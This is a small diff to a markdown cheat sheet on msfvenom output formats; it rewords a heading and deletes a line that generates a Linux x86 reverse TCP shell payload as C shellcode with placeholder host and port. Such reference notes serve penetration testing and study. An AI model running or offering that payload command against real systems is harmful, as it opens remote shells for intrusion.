@@ -1,6 +1,6 @@
 # Formats
 
-- To List all Formats
+To list all formats
 
 ```
 $ msfvenom -l formats
@@ -78,5 +78,3 @@ Framework Transform Formats [--format <value>]
     vbapplication
     vbscript
 ```
-
-`$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<IP> lport=<PORT> -f c -o sc-x86.c`
